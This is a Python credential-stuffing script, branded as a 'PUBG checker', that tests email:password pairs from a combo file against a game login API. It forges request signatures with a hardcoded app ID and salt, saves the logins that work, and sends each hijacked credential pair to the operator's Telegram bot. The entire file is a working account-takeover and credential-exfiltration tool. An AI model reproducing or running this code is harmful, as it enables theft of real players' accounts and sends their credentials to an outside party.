import requests,hashlib,random,string,time
r = requests.session()
print("""
██████╗ ██╗   ██╗██████╗  ██████╗
██╔══██╗██║   ██║██╔══██╗██╔════╝ Checker By Loy Drestize Ali Cybery 
██████╔╝██║   ██║██████╔╝██║  ███╗
██╔═══╝ ██║   ██║██╔══██╗██║   ██║
██║     ╚██████╔╝██████╔╝╚██████╔╝
╚═╝      ╚═════╝ ╚═════╝  ╚═════╝ 
    t.me/edrisnabizada420
    Creaded by Edris Nabizada
print'                                        '
jalan("\x1b[1;92mINPUT USERNAME & PASSWORD")
print 25* '\033[1;96m-'
print'                                        '
CorrectUsername = "edris"
CorrectPasscode = "nabizada"

loop = 'true'
while (loop == 'true'):
    username = raw_input("                   \x1b[1;93mINPUT USERNAME \x1b[1;96m: ")
    if (username == CorrectUsername):
            print """
            \033[1;92m        Correct
                  """
            loop = 'false'
    else:
            print "\033[1;91m☠️WRONG"
            os.system('xdg-open https://t.me/Best_Hacker00420')

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("                   \x1b[1;93mINPUT PASSWORD \x1b[1;96m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92m        Correct
                  """
                  
            jalan("[𝕳𝕿𝕽] Logging in\x1b[1;93m ●\x1b[1;91m ●\x1b[1;96m ●\x1b[1;95m ●")     
                 
            loop = 'false'
    else:
            print "\033[1;91m☠️WRONG"
            os.system('xdg-open https://t.me/Best_Hacker00420')
     
""")
ID= input('[+] ID : ')
token = input('[+] TOKEN ROBOT : ')
headPUB = {
	"Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
def CHECK(email,pess):
  eml = email
  pas = pess
  YES = f"""  
[✓] Hacked PUBG Edris Nabizada:
[✓] Email: {eml}
[✓] Pass: {pas}
━━━━━━━━━━━━━"""
  NO = f"""
[-] NOT Hacked PUBG Edris Nabizada :
[-] Email: {eml}
[-] Pass: {pas}
━━━━━━━━━━━━━"""
  pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
  J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
  url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
  daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
  time.sleep(0.5)
  GO=r.get(url, data=daPU,headers=headPUB).text
  if '"token"' in GO:
    print(YES)
    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @Kingsniper001  💸')
    with open('NWE-PUBG.txt', 'a') as x:
      x.write(eml+':'+pas+' |@XD_CAL\n')
  else:
    print(NO)
def FILname():
  F = input('[+] Enter the name the combo file : ')
  try:
    for x in open(F,'r').read().splitlines():
      email = x.split(":")[0]
      pess = x.split(":")[1]
      CHECK(email,pess)
  except FileNotFoundError:
    print('\n[-] The file name is incorrect !\n')
    return FILname()
FILname()